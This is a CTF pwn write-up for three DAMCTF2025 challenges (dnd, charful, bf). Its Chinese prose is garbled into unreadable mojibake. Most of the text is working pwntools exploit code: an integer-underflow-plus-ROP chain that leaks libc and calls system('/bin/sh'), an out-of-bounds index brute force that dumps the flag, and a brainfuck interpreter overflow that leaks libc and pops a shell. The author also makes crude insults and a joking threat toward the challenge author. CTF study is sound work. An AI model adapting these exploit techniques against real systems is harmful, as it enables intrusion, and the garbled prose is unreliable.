export const layout = "#components/Page.js";
export const title = "DAMCTF2025 Writeup";
export const created = "2025-05-12T10:37:16+08:00";

# DAMCTF2025 Pwn WriteUp

æœ¬æ¥å‘¨æœ«æƒ³ç€æ‰“é‚£ä¸ª midnight sun CTF2025 æ¥ç€ï¼Œç»“æœæ¨è¿Ÿäº†ï¼Œå°±çœ‹äº†è¿™ä¸€åœº DAMCTF2025 å’Œå¦å¤–ä¸€åœº Break The Syntax CTF2025ã€‚ã€‚

## dnd

ç®€å•é€†å‘ä¸€ä¸‹æ¢å¤ç»“æ„ä½“ï¼š

```c
00000000 struct Game // sizeof=0x4
00000000 {
00000000     char point;
00000001     char health;
00000002     char attack;
00000003     char d;
00000004 };

00000000 struct Monster // sizeof=0x3
00000000 {
00000000     char health;
00000001     char damage;
00000002     char c;
00000003 };
```

æ¢å¤å‡ºæ¥ `Monster::attack` å‡½æ•°å¦‚ä¸‹ï¼š

```c
Game *__fastcall Monster::Attack(Monster *monster, Game *you)
{
  __int64 v2; // rax
  Game *result; // rax
  __int64 v4; // rax

  if ( you->attack <= monster->health )
  {
    v4 = std::operator<<<std::char_traits<char>>(&std::cout, "Oof, that hurt ;(");
    std::ostream::operator<<(v4, &std::endl<char,std::char_traits<char>>);
    you->health -= monster->damage;
    result = you;
    you->point -= monster->health;              // æ•´æ•°æº¢å‡º
  }
  else
  {
    v2 = std::operator<<<std::char_traits<char>>(&std::cout, "You defeated the monster!");
    std::ostream::operator<<(v2, &std::endl<char,std::char_traits<char>>);
    you->point += monster->health;
    result = you;
    ++you->attack;                              // inc attack
  }
  return result;
}
```

åªè¦æŠŠ youâ†’point å˜æˆè´Ÿæ•°

![image.png](https://pic1.imgdb.cn/item/68215fba58cb8da5c8ecc4de.png)

è¿™é‡Œçš„æ¯”è¾ƒç”¨çš„æ˜¯æ— ç¬¦å·æ•°ï¼Œæ‰€ä»¥ä¸Šé¢çš„è´Ÿæ•°å¾ˆå®¹æ˜“å°±é€šè¿‡è¿™ä¸ªæ£€æµ‹ã€‚

ç„¶åå°±æ˜¯ä¸€ä¸ªç™½ç»™çš„æ ˆæº¢å‡ºã€‚

é¢˜ç›®çš„äº¤äº’æ¯”è¾ƒæŠ½è±¡ï¼Œæœ¬åœ°ä¸€å¼€å§‹çå†™è¸©äº†å¾ˆå¤šå‘ï¼Œåæ¥é‡å†™äº†ä¸€ä¸‹ï¼Œexpï¼š

```python
#!/usr/bin/env python3

from pwn import *
from sys import argv

proc = "./dnd_patched"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
libc = ELF("./libc.so.6", checksec=False)
io = remote("dnd.chals.damctf.xyz", 30813) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io, """
    b *0x402960
    """)

def get_point():
    io.recvuntil(b"Attack: ")
    attack = int(io.recv(1).decode(), 10)
    io.recvuntil(b" (")
    health = int(io.recvuntil(b" health", drop=True).decode(), 10)
    if attack <= health:
        io.sendlineafter(b"Do you want to [a]ttack or [r]un?", b"a")
    else:
        io.sendlineafter(b"Do you want to [a]ttack or [r]un?", b"a")
    io.recvuntil(b">>> Round ")
    io.recvuntil(b"Points: ")
    points = int(io.recvuntil(b" | Health: ", drop=True).decode(), 10)
    return points

def get_overflow():
    io.recvuntil(b"Can you survive all 5 rounds?")
    res = 0
    io.recvuntil(b">>> Round ")
    io.recvuntil(b"Points: ")
    points = int(io.recvuntil(b" | Health: ", drop=True).decode(), 10)
    for i in range(5):
        res = get_point()
        if res < 0:
            for j in range(4 - i):
                io.sendlineafter(b'Do you want to [a]ttack or [r]un? ', b"r")
            break

get_overflow()

# 0x0000000000402640: pop rdi; nop; pop rbp; ret;
# 0x000000000040201a: ret;

pop_rdi_ret = 0x402640
main = 0x402988
ret = 0x40201a
payload = flat([cyclic(104, n=8), pop_rdi_ret, elf.got['puts'], 0, elf.plt['puts'], main])
io.sendlineafter(b'What is your name, fierce warrior? ', payload)
# io.sendline(payload)
io.recvuntil(b"\n")
puts_addr = u64(io.recvuntil(b"\n", drop=True).ljust(8, b"\x00"))
libc_addr = puts_addr - 0x87be0
log.info(f"libc_addr => {hex(libc_addr)}")
libc.address = libc_addr

get_overflow()
binsh = next(libc.search(b"/bin/sh\x00"))
payload = flat([cyclic(104, n=8), pop_rdi_ret, binsh, 0, ret, libc.sym['system']])
io.sendlineafter(b'What is your name, fierce warrior? ', payload)

io.interactive()
```

## charful

é¢˜ç›®ç»™äº†ä¸ªå‹ç¼©åŒ…ï¼Œæ‰“å¼€ï¼Œé‡Œé¢æœ‰ main.c, todos.c, todos.hï¼Œç»™äº†æºä»£ç  makefile dockerfileï¼Œç„¶åå†ä¸‹è½½å‡ºé¢˜äººæçš„å¯æ‰§è¡Œæ–‡ä»¶ï¼Œçœ‹ä¸€ä¸‹åŸºæœ¬ä¿¡æ¯ï¼š

```bash
$ file todos_arm
todos_arm: ELF 32-bit LSB executable, ARM, EABI5 version 1 (GNU/Linux), statically linked, BuildID[sha1]=ea22cc12e1971e647ebf3c451feca3cbaf59c926, for GNU/Linux 3.2.0, not stripped
```

ok 32 ä½ armï¼Œæˆ‘ä¸çŸ¥é“ä¸ºä»€ä¹ˆå‡ºé¢˜äººä¼šç»™ä¸€ä¸ªå¤ç°ä¸äº†çš„ dockerfile å‡ºæ¥ï¼Ÿç»™è¿™ä¸ª dockerfile çš„æ„ä¹‰æ˜¯ï¼Ÿæˆ‘ç”¨ä»–çš„ dockerfile build å‡ºæ¥çš„å¯æ‰§è¡Œæ–‡ä»¶æ˜¯è¿™æ ·ï¼š

```bash
$ file todos
todos: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=84f666f27998b6edf31415eb4079223c150c9c28, for GNU/Linux 3.2.0, not stripped
```

åˆ°è¿™é‡Œå·²ç»åˆè§ç«¯å€ªäº†ï¼Œæ˜¯çš„ï¼Œå‡ºé¢˜äººä¸æ˜¯äººï¼Œæ²¡çœ‹å‡ºæ¥ä¹Ÿæ²¡å…³ç³»ï¼Œç»§ç»­åšã€‚

![image.png](https://pic1.imgdb.cn/item/6821604458cb8da5c8ecc5bc.png)

èœå•é¢˜ï¼Œé‚£æ„Ÿè§‰å¯èƒ½æ¯”è¾ƒå¤æ‚äº†ï¼Œä¼°è®¡å¾—é€ä¸ªé€†å‘

é¢˜ç›®æç¤ºè¯´è¿™æ˜¯æ•´æ•°æº¢å‡ºâ€¦..çœ‹äº†ä¸€ä¼šï¼Œæ„Ÿè§‰æŒ‰ç…§é¢˜ç›®è¿™ä¸ªæ£€æŸ¥æ–¹æ³•ï¼Œåº”è¯¥ä¸å¯èƒ½æº¢å‡ºå•Šï¼Ÿï¼Ÿï¼Ÿåœ¨è¿™é‡Œå¡äº†å¾ˆä¹…ï¼Œæ‰¾ä¸åˆ°ğŸ•³

![image.png](https://pic1.imgdb.cn/item/6821606858cb8da5c8ecc5e9.png)

ï¼ˆæ€€ç–‘äººç”Ÿ.jpgï¼‰

éšä¾¿è¾“å…¥äº†ä¸€äº› fuzz ä¸€ä¸‹ï¼Œç»“æœå‡ºç°äº†éé¢„æœŸçš„è¾“å‡ºï¼Ÿæˆ‘è‰ï¼Ÿ

ä»”ç»†çœ‹ä¸€ä¸‹ï¼Œåœ¨æºç é‡Œæ˜¯è¿™ä¹ˆå†™çš„ï¼š

![image.png](https://pic1.imgdb.cn/item/6821608b58cb8da5c8ecc5f1.png)

ida é€†å‘å‡ºæ¥æ˜¯è¿™æ ·çš„ï¼š

![image.png](https://pic1.imgdb.cn/item/682160ac58cb8da5c8ecc609.png)

ï¼Ÿç»™çš„æºä»£ç å’Œå¯æ‰§è¡Œæ–‡ä»¶ä¸ä¸€æ ·ï¼Œç»™æºä»£ç çš„æ„ä¹‰æ˜¯ä»€ä¹ˆå‘¢ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

åˆ°è¿™ä½ ä¼šè§‰å¾—å‡ºé¢˜äººç¡®å®ä¸å¤ªè¯—äººï¼Œåˆ«æ€¥ã€‚

åˆšæ‰è¯´äº†è¿™æ˜¯ä¸ªèœå•é¢˜ï¼Œä»”ç»†çœ‹ä¸€ä¸‹åŠŸèƒ½ï¼Œæƒ³äº†æƒ³ï¼Œä¼¼ä¹åªéœ€è¦ print_todo è¿™ä¸€ä¸ªåŠŸèƒ½å°±èƒ½æŠŠå†…å­˜é‡Œçš„ flag æ‰“å°å‡ºæ¥äº†å§ï¼Ÿ

ä¸å¤ªç¡®å®šï¼Œå†™ä¸ªè„šæœ¬çœ‹çœ‹ï¼š

```python
from pwn import *
from sys import argv

proc = "./todos_arm"
context.log_level = "debug"
context.binary = proc
elf = ELF(proc, checksec=False)
io = remote("charful.chals.damctf.xyz", 30128) if argv[1] == 'r' else process(proc)

if args.G:
    gdb.attach(io, """
    b *0x4019D5
    """)

def choose(idx):
    io.sendlineafter(b"What would you like to do? ", str(idx).encode())

def show(idx):
    choose(2)
    io.sendlineafter(b"Which TODO would you like to print? ", str(idx).encode())

for i in range(-330, -300):
    res = i & 0xffffffff
    log.info(f"res => {i} => {res}")
    show(res)

io.interactive()
```

ï¼Ÿ

![image.png](https://pic1.imgdb.cn/item/682160c258cb8da5c8ecc614.png)

ç›´æ¥å‡ºäº†ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ

ä¸æ˜¯å“¥ä»¬ï¼Ÿé‚£ä½ ä»–å¦ˆå†™é‚£ä¹ˆå¤šåŠŸèƒ½å¹²å˜›ï¼Ÿ

å“¦å¯¹ï¼Œä¸ºä»€ä¹ˆç¬¬ä¸€æ¬¡åªæ‰¾åˆ°äº†ä¸€åŠçš„ flag å‘¢ï¼Ÿå“ˆå“ˆï¼Œå› ä¸ºé¶æœºè¿œç¨‹å¤ªå¡äº†ï¼Œç¬¬ä¸€æ¬¡çˆ†åˆ°ä¸€åŠ dump äº†ï¼Œè¿˜å¥½æˆ‘è‡ªä¿¡ğŸ˜

ä»¥å daimi å†è®©æˆ‘åšè¿™ç§å‚»é€¼é¢˜æˆ‘å°±æŠŠ daimi æ€äº†ã€‚


## bf

å­˜åœ¨æº¢å‡ºæ¼æ´ï¼Œç®€å•åˆ©ç”¨å³å¯

Zzz

```python
# >,    //è¯»å…¥ä¸€ä¸ªå­—ç¬¦nï¼Œä»£è¡¨æˆ‘ä»¬è¦è¾“å…¥å­—ç¬¦çš„ä¸ªæ•°
# [
#   [>] //å‘å³ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ª0å­—ç¬¦çš„ä½ç½®ï¼ˆå­—ç¬¦ä¸²å¤´
#   ,   //è¾“å…¥å­—ç¬¦
#   [<] //å‘å·¦ç§»åŠ¨åˆ°ç¬¬ä¸€ä¸ª0å­—ç¬¦ä¸²ä½ç½®ï¼ˆå­—ç¬¦ä¸²å°¾
#   >-  //å‘å³ç§»åŠ¨åˆ°nå¹¶å°†å…¶-1
# ]     //è‹¥ä¸º0è·³å‡ºå¾ªç¯

# -     //å‰©ä¸‹çš„we don't care
# [>]
# -
# [<.+]
# ++++++++++.
```

expï¼š

```python
from pwn import *
filename='./bf'
libc='./libc.so.6'

sla = lambda x,s : p.sendlineafter(x,s)
sl = lambda s : p.sendline(s)
sa = lambda x,s : p.sendafter(x,s)
s = lambda s : p.send(s)

# p=process(filename)
# e=ELF(filename)
libc=ELF(libc)
context.log_level='debug'
# context(arch=e.arch, bits=e.bits, endian=e.endian, os=e.os)
# gdb.attach(p)

def translate(code: str, output=None, start=0, depth=0):
    if output is None:
        output = [0] * len(code)

    sp = start
    loop_start = start

    while sp < len(code) and code[sp] != '\0':
        ch = code[sp]

        if ch == '>':
            output[sp] = (output[sp] & 0xFFFFFF00) | 1
            sp += 1
        elif ch == '<':
            output[sp] = (output[sp] & 0xFFFFFF00) | 2
            sp += 1
        elif ch == '.':
            output[sp] = (output[sp] & 0xFFFFFF00) | 3
            sp += 1
        elif ch == ',':
            output[sp] = (output[sp] & 0xFFFFFF00) | 4
            sp += 1
        elif ch == '+':
            output[sp] = (output[sp] & 0xFFFFFF00) | 5
            sp += 1
        elif ch == '-':
            output[sp] = (output[sp] & 0xFFFFFF00) | 6
            sp += 1
        elif ch == '[':
            output[sp] = (output[sp] & 0xFFFFFF00) | 7
            jump_target = translate(code, output, sp + 1, depth + 1)
            if jump_target == 0:
                return 0
            output[sp] = ((jump_target & 0xFFFF) << 16) | (output[sp] & 0xFFFF)
            sp = jump_target
        elif ch == ']':
            if depth == 0:
                return 0
            output[sp] = (output[sp] & 0xFFFFFF00) | 8
            output[sp] = ((loop_start & 0xFFFF) << 16) | (output[sp] & 0xFFFF)
            return sp + 1
        else:
            return 0

    return 0 if depth else sp
                #>,[[>],[<]>-]-[>]-[<.+]++++++++++.
official_code = ">,[[>],[<]>-]-[>]-[<.+]++++++++++."
code = '>,[[>],[<]>-]-[>]-[<.+][[->.,+]'

out = [0] * len(code)
end = translate(code, out)
print([hex(x) for x in out])

# p = process(['./bf',official_code])
p = remote('brain-a-tac.chals.damctf.xyz',31337)
# gdb.attach(p,'go')
# >< ., +- []
# 12 34 56 78
pay = b'\xff' * 7
pay += p32(0x02020205) + p32(0x02020201) + p32(0x02020203) + p32(0x02020204) + p32(0x01010106) + p32(0xffdd0208)
pay += b'\x00'+ b'1'*(0x72-6) + b'\xff'
# for x in out:
    # pay+=p32(x)
for i in range(0,len(pay)):
    s(pay[i:i+1])
# p.interactive()
s(b'2'*0x25b+b'\x87')

# p.interactive()
# s(b'\x00'*0x7e+b'\xff')
s(p64(0))
# s(b'\x00'*0x1b0+p32
# (0)+b'\x87')
# p.recvuntil(p64(2))
# pause()
# p.interactive()
# p.close()
x = p.recvuntil('\xb8')
s('\x3c')
libcbase = u8('\xb8')

x = p.recv(1)
libcbase += u8(x) << 8
s(p8(u8(x)+(0x90-0xa3)))
x = p.recv(1)
libcbase += u8(x) << 16
s(p8(u8(x)+(0x11-0x2)))
x = p.recv(1)
# #11903c


libcbase += u8(x) << 24
s(x)

x = p.recv(1)
libcbase += u8(x) << 32
s(x)

x = p.recv(1)
libcbase += u8(x) << 40
s(x+b'\x00\x00')
libcbase = libcbase - 0x2a3b8
rdi = libcbase + 0x11903c
binsh = libcbase + libc.search('/bin/sh').__next__()
saddr = libcbase + libc.sym['system']
s(p64(binsh)+p64(rdi+1)+p64(saddr))
print(hex(libcbase))
# p.interactive()
# pause()
s('\x01')
p.interactive()

# >< ., +- []
# 12 34 56 78
# >,
# [
#   [>]
#   ,
#   [<]
#   >-
# ]
# -
# [>]
# -
# [<.+]
# ++++++++++.
```
